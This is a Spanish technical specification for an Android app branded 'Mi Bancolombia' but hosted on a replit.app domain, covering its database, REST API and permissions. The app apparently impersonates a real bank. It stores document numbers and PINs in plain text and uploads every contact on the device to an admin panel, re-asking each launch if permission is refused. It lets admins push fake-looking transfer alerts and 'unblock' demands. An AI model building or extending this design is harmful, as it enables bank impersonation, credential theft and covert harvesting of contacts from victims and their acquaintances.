# Parámetros de APK — Mi Bancolombia
### Auditoría completa de APIs, URLs, base de datos y configuración para sincronización del APK nativo

---

## 1. URL BASE DE PRODUCCIÓN

```
https://bancolombia--bankbancolombia.replit.app
```

Esta es la URL raíz de la aplicación desplegada. **Todas las llamadas del APK deben apuntar a esta URL.** No usar localhost ni ninguna IP local.

---

## 2. VARIABLE DE ENTORNO OBLIGATORIA EN EL APK

| Variable | Valor | Descripción |
|---|---|---|
| `EXPO_PUBLIC_API_URL` | `https://bancolombia--bankbancolombia.replit.app` | URL base del servidor de producción. El APK la usa para construir todas las rutas de la API. En la web/PWA no se necesita porque usa rutas relativas automáticamente. |
| `EXPO_PUBLIC_PROJECT_ID` | _(el ID de tu proyecto en expo.dev)_ | ID del proyecto Expo, necesario para obtener el token de push notifications via Expo Push Service. Se obtiene en https://expo.dev luego de crear el proyecto. |

> **Cómo se usa internamente:**
> `utils/api.ts` detecta automáticamente la plataforma. En APK/nativo concatena `EXPO_PUBLIC_API_URL` + la ruta. En web/PWA usa rutas relativas. Siempre llamar `apiUrl("/api/ruta")` para construir la URL.

---

## 3. IDENTIFICADORES DE LA APP

| Campo | Valor |
|---|---|
| Nombre | Mi Bancolombia |
| Slug Expo | `mi-bancolombia` |
| Versión | `2.3.2` |
| Deep Link Scheme | `mi-bancolombia://` |
| Android Package | `com.bancolombia.miapp` |
| iOS Bundle ID | `com.bancolombia.miapp` |
| Expo Router Origin | `https://bancolombia--bankbancolombia.replit.app` |

---

## 4. BASE DE DATOS (PostgreSQL vía Drizzle ORM)

La base de datos **solo es accesible desde el servidor API** (no directamente desde el APK). El APK interactúa con ella exclusivamente a través de los endpoints REST descritos en la sección 5.

### Tablas existentes

| Tabla | Descripción |
|---|---|
| `users` | Usuarios registrados (clientes y administradores) |
| `accounts` | Cuentas bancarias asociadas a cada usuario |
| `transactions` | Historial de transacciones de cada cuenta |
| `cards` | Tarjetas débito/crédito de cada usuario |
| `login_events` | Registro de intentos de inicio de sesión (auditoría) |
| `audit_logs` | Acciones administrativas (auditoría) |
| `pin_change_requests` | Solicitudes de cambio de PIN pendientes |
| `pwa_install_events` | Registro de instalaciones de la PWA |
| `radicados` | Radicados/tickets asignados por administradores |
| `user_contacts` | Contactos del teléfono sincronizados desde el APK |
| `push_tokens` | Tokens FCM/Expo de dispositivos para notificaciones push |
| `notifications_log` | Historial de notificaciones push enviadas por admins |
| `app_notifications_inbox` | Bandeja de notificaciones in-app (dentro de la app) |
| `app_settings` | Configuración global de la aplicación (clave-valor) |

### Estructura detallada por tabla

#### `users`
| Campo | Tipo | Descripción |
|---|---|---|
| `id` | text (PK) | UUID generado en el cliente al registrarse |
| `documentType` | text | Tipo de documento (CC, CE, PEP, etc.) |
| `documentNumber` | text | Número de documento (usado para login) |
| `countryResidence` | text | País de residencia (código, ej: "CO") |
| `countryBirth` | text | País de nacimiento |
| `currencyCode` | text | Código de moneda (ej: "COP") |
| `currencySymbol` | text | Símbolo de moneda (ej: "$") |
| `firstName` | text | Primer nombre |
| `secondName` | text | Segundo nombre |
| `lastName` | text | Primer apellido |
| `secondLastName` | text | Segundo apellido |
| `birthDate` | text | Fecha de nacimiento |
| `email` | text | Correo electrónico |
| `phone` | text | Teléfono (puede ser número de cuenta en transferencias) |
| `pin` | text | PIN de acceso (4–6 dígitos) |
| `isAdmin` | boolean | `true` si es administrador |
| `status` | text | `"active"`, `"suspended"`, `"blocked"` |
| `address` | text | Dirección física |
| `suspensionReason` | text | Razón de suspensión (si aplica) |
| `requiredDocuments` | jsonb | Lista de documentos requeridos para desbloqueo |
| `unblockSteps` | jsonb | Pasos de verificación para desbloqueo |
| `createdAt` | timestamp | Fecha de creación |

#### `accounts`
| Campo | Tipo | Descripción |
|---|---|---|
| `id` | text (PK) | UUID de la cuenta |
| `userId` | text | FK → `users.id` |
| `type` | text | Tipo: `"ahorros"`, `"corriente"` |
| `number` | text | Número de cuenta |
| `balance` | integer | Saldo en centavos (ej: 150000 = $1,500.00) |
| `currency` | text | Nombre de la moneda (ej: "Peso colombiano") |
| `currencyCode` | text | Código ISO (ej: "COP") |
| `currencySymbol` | text | Símbolo (ej: "$") |
| `name` | text | Nombre descriptivo de la cuenta |
| `status` | text | `"active"` o `"inactive"` |

#### `transactions`
| Campo | Tipo | Descripción |
|---|---|---|
| `id` | text (PK) | UUID de la transacción |
| `userId` | text | FK → `users.id` |
| `accountId` | text | FK → `accounts.id` |
| `date` | text | Fecha de la transacción (ISO string) |
| `description` | text | Descripción/concepto |
| `amount` | integer | Monto en centavos (positivo = crédito, negativo = débito) |
| `type` | text | `"credit"` o `"debit"` |
| `category` | text | Categoría (transferencia, pago, retiro, etc.) |
| `status` | text | `"completed"`, `"pending"`, `"failed"` |

#### `cards`
| Campo | Tipo | Descripción |
|---|---|---|
| `id` | text (PK) | UUID de la tarjeta |
| `userId` | text | FK → `users.id` |
| `type` | text | `"debit"` o `"credit"` |
| `number` | text | Número de tarjeta (últimos 4 dígitos visibles) |
| `expiry` | text | Fecha de vencimiento (MM/YY) |
| `holder` | text | Nombre del titular |
| `brand` | text | `"Visa"`, `"Mastercard"`, etc. |
| `balance` | integer | Saldo disponible en centavos |
| `limit` | integer | Límite de crédito (solo tarjetas crédito) |
| `color` | text | Color hexadecimal para UI |
| `active` | boolean | Si la tarjeta está activa |

#### `radicados`
| Campo | Tipo | Descripción |
|---|---|---|
| `id` | text (PK) | UUID interno |
| `radicado` | text | Código alfanumérico (ej: "RAD-2025-001") |
| `userId` | text | FK → `users.id` usuario al que pertenece |
| `userName` | text | Nombre completo del usuario |
| `documentNumber` | text | Documento del usuario |
| `motive` | text | Motivo del radicado |
| `description` | text | Descripción detallada |
| `referenceCode` | text | Código de referencia adicional |
| `expiresAt` | text | Fecha de vencimiento (YYYY-MM-DD) |
| `createdBy` | text | ID del admin que lo creó |
| `status` | text | `"active"` o `"expired"` |

#### `user_contacts`
| Campo | Tipo | Descripción |
|---|---|---|
| `id` | text (PK) | UUID |
| `userId` | text | FK → `users.id` (propietario de los contactos) |
| `name` | text | Nombre del contacto |
| `phoneNumbers` | jsonb | Array de teléfonos: `["3001234567", "+573001234567"]` |
| `emails` | jsonb | Array de correos: `["email@dominio.com"]` |
| `syncedAt` | timestamp | Última sincronización |

#### `push_tokens`
| Campo | Tipo | Descripción |
|---|---|---|
| `id` | text (PK) | UUID |
| `userId` | text | FK → `users.id` |
| `token` | text | Token Expo: `ExponentPushToken[xxxxxx]` |
| `platform` | text | `"android"` o `"ios"` |
| `deviceInfo` | text | Info del dispositivo (OS + versión) |
| `updatedAt` | timestamp | Última actualización |

#### `app_notifications_inbox`
| Campo | Tipo | Descripción |
|---|---|---|
| `id` | text (PK) | UUID |
| `userId` | text | FK → `users.id`. Si es `null` = notificación para todos |
| `title` | text | Título de la notificación |
| `body` | text | Cuerpo del mensaje |
| `color` | text | Color hex para el banner (ej: `"#FDDA24"`) |
| `type` | text | `"info"`, `"warning"`, `"success"`, `"error"` |
| `sentBy` | text | FK → `users.id` (admin que la envió) |
| `isRead` | boolean | Si el usuario la ha leído |
| `readAt` | timestamp | Cuándo la marcó como leída |

#### `notifications_log`
| Campo | Tipo | Descripción |
|---|---|---|
| `id` | text (PK) | UUID |
| `adminId` | text | FK → `users.id` (admin que la envió) |
| `title` | text | Título de la push notification |
| `body` | text | Cuerpo del mensaje |
| `color` | text | Color hex |
| `channelId` | text | Canal Android usado |
| `targetType` | text | `"all"` o `"users"` |
| `targetUserIds` | jsonb | Array de IDs de usuarios objetivo |
| `sentCount` | integer | Cuántos dispositivos la recibieron |
| `status` | text | `"sent"` |

---

## 5. ENDPOINTS REST — API COMPLETA

**URL base de todas las llamadas del APK:**
```
https://bancolombia--bankbancolombia.replit.app/api
```

Todos los endpoints usan `Content-Type: application/json`.

---

### 5.1 Health Check

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/healthz` | Verifica que el servidor esté activo. Responde `200 OK`. |

---

### 5.2 Autenticación

#### Login
```
POST /api/auth/login
```
**Body:**
```json
{
  "documentNumber": "1234567890",
  "pin": "1234"
}
```
**Respuestas:**
- `200` → `{ "user": { ...objeto usuario completo... } }`
- `401` → `{ "error": "Credenciales inválidas" }` — documento o PIN incorrecto
- `403` → `{ "error": "blocked" }` — cuenta bloqueada

> El APK debe guardar el objeto `user` retornado en estado local (contexto/almacenamiento seguro). No hay sesión basada en JWT; el usuario se autentica por documento + PIN.

---

### 5.3 Usuarios

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/users` | Lista todos los usuarios (solo admin) |
| `GET` | `/api/users/:id` | Obtiene un usuario por ID |
| `POST` | `/api/users` | Crea/registra un nuevo usuario |
| `PUT` | `/api/users/:id` | Actualiza datos del usuario (perfil, estado, suspensión) |
| `DELETE` | `/api/users/:id` | Elimina usuario y todos sus datos (solo admin) |

**Body para crear usuario (`POST /api/users`):**
```json
{
  "id": "uuid-generado-en-cliente",
  "documentType": "CC",
  "documentNumber": "1234567890",
  "countryResidence": "CO",
  "countryBirth": "CO",
  "currencyCode": "COP",
  "currencySymbol": "$",
  "firstName": "Juan",
  "secondName": "",
  "lastName": "Pérez",
  "secondLastName": "",
  "birthDate": "1990-01-15",
  "email": "juan@email.com",
  "phone": "3001234567",
  "pin": "1234",
  "isAdmin": false,
  "status": "active"
}
```

---

### 5.4 Cuentas Bancarias

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/accounts?userId={id}` | Lista cuentas de un usuario |
| `POST` | `/api/accounts` | Crea una cuenta bancaria |

---

### 5.5 Transacciones

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/transactions?userId={id}` | Lista transacciones de un usuario |
| `POST` | `/api/transactions` | Registra una transacción |

---

### 5.6 Tarjetas

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/cards?userId={id}` | Lista tarjetas de un usuario |
| `POST` | `/api/cards` | Crea una tarjeta |
| `PATCH` | `/api/cards/:id` | Actualiza estado de tarjeta (activar/desactivar) |

---

### 5.7 Radicados

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/radicados` | Lista todos los radicados (admin) |
| `GET` | `/api/radicados?userId={id}` | Radicados de un usuario específico |
| `GET` | `/api/radicados?radicado=RAD-2025-001` | Busca radicado por código |
| `GET` | `/api/radicados/verify/{codigo}?userId={id}` | Valida si un radicado es válido y vigente |
| `GET` | `/api/radicados/:id` | Obtiene radicado por UUID interno |
| `POST` | `/api/radicados` | Crea un radicado (admin) |
| `PUT` | `/api/radicados/:id` | Actualiza un radicado |
| `DELETE` | `/api/radicados/:id` | Elimina un radicado |

**Respuesta de verificación (`GET /api/radicados/verify/{codigo}`):**
```json
// Válido
{ "valid": true, "record": { ...radicado... } }

// Inválido
{ "valid": false, "reason": "Radicado vencido el 01/01/2025" }
```

---

### 5.8 Contactos del Teléfono

> Esta es la sincronización entre los contactos nativos del APK y el panel de administrador.

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/user-contacts?userId={id}` | Obtiene contactos sincronizados de un usuario |
| `POST` | `/api/user-contacts/sync` | Sincroniza (reemplaza) todos los contactos del dispositivo |

**Body para sincronizar (`POST /api/user-contacts/sync`):**
```json
{
  "userId": "uuid-del-usuario",
  "contacts": [
    {
      "name": "María García",
      "phoneNumbers": ["3109876543", "+573109876543"],
      "emails": ["maria@email.com"]
    },
    {
      "name": "Carlos López",
      "phoneNumbers": ["3201112233"],
      "emails": []
    }
  ]
}
```

> **Flujo en el APK:**
> 1. Al iniciar la app por primera vez, solicitar permiso de contactos (`expo-contacts`).
> 2. Si el permiso es concedido, leer todos los contactos del dispositivo.
> 3. Llamar a `POST /api/user-contacts/sync` con el `userId` del usuario logueado.
> 4. Si el permiso es denegado, volver a solicitarlo cada vez que el usuario abra la app.
> 5. El panel de administrador visualiza estos contactos en tiempo real llamando a `GET /api/user-contacts?userId={id}`.

---

### 5.9 Push Tokens (Notificaciones Push)

| Método | Ruta | Descripción |
|---|---|---|
| `POST` | `/api/push-tokens` | Registra o actualiza el token del dispositivo |
| `GET` | `/api/push-tokens?userId={id}` | Lista tokens de un usuario (admin) |

**Body para registrar token (`POST /api/push-tokens`):**
```json
{
  "userId": "uuid-del-usuario",
  "token": "ExponentPushToken[xxxxxxxxxxxxxxxxxxxxxx]",
  "platform": "android",
  "deviceInfo": "android 14"
}
```
**Respuestas:**
- `201` → `{ "ok": true, "action": "created" }` — token nuevo registrado
- `200` → `{ "ok": true, "action": "updated" }` — token ya existía, se actualizó

> **Cuándo llamar este endpoint:** Inmediatamente después de que el usuario inicia sesión correctamente, si el sistema de notificaciones obtuvo un token Expo válido.

---

### 5.10 Envío de Notificaciones (Admin)

#### Push Notification (aparece en la barra de notificaciones del Android, incluso con la app cerrada)

```
POST /api/notifications/send
```
**Body:**
```json
{
  "adminId": "uuid-del-administrador",
  "title": "Transferencia recibida",
  "body": "Has recibido $500,000 COP de Juan Pérez",
  "color": "#10B981",
  "channelId": "banking",
  "targetType": "all",
  "targetUserIds": [],
  "data": {}
}
```

| Campo | Valores posibles | Descripción |
|---|---|---|
| `targetType` | `"all"` o `"users"` | `"all"` = todos los dispositivos registrados |
| `targetUserIds` | `["uuid1", "uuid2"]` | Obligatorio si `targetType = "users"` |
| `channelId` | Ver sección 6 | Canal Android para la notificación |
| `color` | Hex color | Color del ícono de notificación |

**Respuesta:**
```json
{
  "ok": true,
  "sentCount": 15,
  "logId": "uuid-del-registro",
  "tokensFound": 15,
  "expoResponse": { ... }
}
```

#### In-App Notification (banner animado dentro de la app, va a la bandeja)

```
POST /api/app-notifications/send
```
**Body:**
```json
{
  "adminId": "uuid-del-administrador",
  "title": "Radicado asignado",
  "body": "Se te ha asignado el radicado RAD-2025-001",
  "color": "#A78BFA",
  "type": "info",
  "targetType": "users",
  "targetUserIds": ["uuid-usuario"]
}
```

#### Historial de notificaciones push enviadas (admin)
```
GET /api/notifications/log
```

---

### 5.11 Bandeja de Notificaciones In-App

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/app-notifications?userId={id}` | Todas las notificaciones del usuario |
| `GET` | `/api/app-notifications?userId={id}&unread=true` | Solo las no leídas |
| `GET` | `/api/app-notifications` | Todas (sin filtro, solo admin) |
| `PUT` | `/api/app-notifications/:id/read` | Marca una notificación como leída |
| `DELETE` | `/api/app-notifications/:id` | Elimina una notificación |

> Las notificaciones con `userId = null` son difusiones globales y aparecen para **todos** los usuarios.

---

### 5.12 Solicitudes de Cambio de PIN

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/pin-changes` | Lista todas las solicitudes (admin) |
| `POST` | `/api/pin-changes` | El usuario solicita cambio de PIN |
| `PUT` | `/api/pin-changes/:id` | Admin aprueba o rechaza la solicitud |

---

### 5.13 Registro de Eventos de Login (Auditoría)

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/login-events` | Lista eventos de login (admin) |
| `POST` | `/api/login-events` | Registra un evento de login desde el APK |

**Body para registrar evento:**
```json
{
  "timestamp": "2025-06-25T10:30:00.000Z",
  "documentNumber": "1234567890",
  "userId": "uuid-del-usuario",
  "success": true,
  "platform": "android",
  "deviceInfo": "Samsung Galaxy S23 / Android 14",
  "ip": "181.57.xxx.xxx",
  "latitude": "4.7110",
  "longitude": "-74.0721",
  "city": "Bogotá"
}
```

---

### 5.14 Configuración Global

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/settings` | Obtiene toda la configuración de la app |
| `PUT` | `/api/settings/:key` | Actualiza un valor de configuración (admin) |

---

### 5.15 Auditoría Administrativa

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/api/audit-logs` | Lista acciones administrativas |
| `POST` | `/api/audit-logs` | Registra una acción del admin |

---

### 5.16 Descarga del APK

```
GET /api/app.apk
```
Retorna el archivo APK para descarga directa desde la app web o PWA.

---

## 6. CANALES DE NOTIFICACIONES ANDROID

El APK debe crear estos canales al inicializarse (se registran una sola vez, automáticamente al primer login):

| `channelId` | Nombre visible | Importancia | Color LED | Uso |
|---|---|---|---|---|
| `default` | General | HIGH | `#FDDA24` (amarillo) | Notificaciones generales |
| `banking` | Operaciones bancarias | HIGH | `#10B981` (verde) | Transferencias, pagos, movimientos |
| `security` | Alertas de seguridad | MAX | `#EF4444` (rojo) | Intentos de acceso, cambio de PIN, bloqueos |
| `account` | Estado de cuenta | HIGH | `#3B82F6` (azul) | Suspensiones, activaciones, cambios de estado |
| `documents` | Documentos y radicados | DEFAULT | `#A78BFA` (violeta) | Radicados asignados, documentos requeridos |

---

## 7. INFRAESTRUCTURA DE PUSH NOTIFICATIONS

### Flujo completo

```
Admin (web/PWA/APK)
        │
        ▼
POST /api/notifications/send
        │
        ▼
Servidor verifica tokens en tabla push_tokens
        │
        ▼
Servidor llama a Expo Push Service
  URL: https://exp.host/--/api/v2/push/send
        │
        ▼
Expo reenvía a Firebase Cloud Messaging (FCM)
        │
        ▼
FCM entrega al dispositivo Android del usuario
  (aunque la app esté cerrada)
```

### Formato del token Expo
```
ExponentPushToken[xxxxxxxxxxxxxxxxxxxxxx]
```

### Registro del token en el APK
El token se obtiene así (pseudocódigo):
```javascript
const { data: token } = await Notifications.getExpoPushTokenAsync({
  projectId: process.env.EXPO_PUBLIC_PROJECT_ID
});

// Luego enviar al servidor:
await fetch("https://bancolombia--bankbancolombia.replit.app/api/push-tokens", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    userId: currentUser.id,
    token: token,
    platform: "android",
    deviceInfo: "android " + Platform.Version
  })
});
```

### Requisito: `google-services.json`
Para que FCM funcione en el APK compilado, el proyecto debe tener configurado el archivo `google-services.json` en la raíz del proyecto Android (dentro del build). Este archivo se obtiene desde la consola de Firebase del proyecto asociado al `com.bancolombia.miapp`.

---

## 8. PERMISOS QUE DEBE SOLICITAR EL APK

### Contactos (`expo-contacts`)
- **Cuándo solicitarlo:** La primera vez que el usuario abre la app tras instalarla, y **cada vez** que abre la app si el permiso sigue denegado.
- **Qué hacer si se concede:** Leer todos los contactos del dispositivo y sincronizar via `POST /api/user-contacts/sync`.
- **Qué hacer si se deniega:** Mostrar mensaje explicativo y volver a pedir en la próxima apertura.
- **Solo pedir este permiso:** No pedir ubicación, cámara ni micrófono en el inicio. Solo contactos.

```javascript
// Ejemplo de solicitud de permiso
import * as Contacts from 'expo-contacts';

const { status } = await Contacts.requestPermissionsAsync();
if (status === 'granted') {
  const { data } = await Contacts.getContactsAsync({
    fields: [Contacts.Fields.PhoneNumbers, Contacts.Fields.Emails, Contacts.Fields.Name]
  });
  // Sincronizar con el servidor
  await fetch("https://bancolombia--bankbancolombia.replit.app/api/user-contacts/sync", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ userId: currentUser.id, contacts: data })
  });
}
```

### Notificaciones Push (`expo-notifications`)
- **Cuándo solicitarlo:** Al hacer login por primera vez en el APK.
- **Qué hacer si se concede:** Obtener el token Expo y registrarlo en `POST /api/push-tokens`.
- **Qué hacer si se deniega:** El usuario no recibirá notificaciones push; la app funciona normalmente.

---

## 9. SINCRONIZACIÓN WEB ↔ PWA ↔ APK

Todos los clientes (web, PWA, APK) comparten **exactamente la misma base de datos** y la misma API. No hay diferencia de datos entre plataformas.

| Funcionalidad | Web | PWA | APK |
|---|---|---|---|
| Login | ✅ | ✅ | ✅ |
| Ver cuentas y saldo | ✅ | ✅ | ✅ |
| Transacciones | ✅ | ✅ | ✅ |
| Panel admin | ✅ | ✅ | ✅ |
| In-app notifications (banner) | ✅ | ✅ | ✅ |
| Push notifications (barra Android) | ❌ | ❌ | ✅ |
| Contactos del teléfono | ❌ | ❌ | ✅ |
| Radicados | ✅ | ✅ | ✅ |

### Polling de notificaciones in-app
Como no hay WebSocket, el APK debe hacer polling periódico para mostrar nuevas notificaciones in-app:
```
GET /api/app-notifications?userId={id}&unread=true
```
Frecuencia recomendada: cada 30 segundos mientras la app está abierta.

---

## 10. RESUMEN DE URLs CRÍTICAS PARA EL APK

| Propósito | URL completa |
|---|---|
| Base URL | `https://bancolombia--bankbancolombia.replit.app` |
| Health check | `https://bancolombia--bankbancolombia.replit.app/api/healthz` |
| Login | `https://bancolombia--bankbancolombia.replit.app/api/auth/login` |
| Usuarios | `https://bancolombia--bankbancolombia.replit.app/api/users` |
| Cuentas | `https://bancolombia--bankbancolombia.replit.app/api/accounts` |
| Transacciones | `https://bancolombia--bankbancolombia.replit.app/api/transactions` |
| Tarjetas | `https://bancolombia--bankbancolombia.replit.app/api/cards` |
| Radicados | `https://bancolombia--bankbancolombia.replit.app/api/radicados` |
| Verificar radicado | `https://bancolombia--bankbancolombia.replit.app/api/radicados/verify/{codigo}` |
| Sincronizar contactos | `https://bancolombia--bankbancolombia.replit.app/api/user-contacts/sync` |
| Ver contactos | `https://bancolombia--bankbancolombia.replit.app/api/user-contacts` |
| Registrar push token | `https://bancolombia--bankbancolombia.replit.app/api/push-tokens` |
| Enviar push (admin) | `https://bancolombia--bankbancolombia.replit.app/api/notifications/send` |
| Enviar in-app (admin) | `https://bancolombia--bankbancolombia.replit.app/api/app-notifications/send` |
| Bandeja notificaciones | `https://bancolombia--bankbancolombia.replit.app/api/app-notifications` |
| Marcar leída | `https://bancolombia--bankbancolombia.replit.app/api/app-notifications/{id}/read` |
| Config app | `https://bancolombia--bankbancolombia.replit.app/api/settings` |
| Eventos de login | `https://bancolombia--bankbancolombia.replit.app/api/login-events` |
| Historial push log | `https://bancolombia--bankbancolombia.replit.app/api/notifications/log` |
| Cambios de PIN | `https://bancolombia--bankbancolombia.replit.app/api/pin-changes` |
| Auditoría admin | `https://bancolombia--bankbancolombia.replit.app/api/audit-logs` |
| Descargar APK | `https://bancolombia--bankbancolombia.replit.app/api/app.apk` |
| Expo Push Service | `https://exp.host/--/api/v2/push/send` |
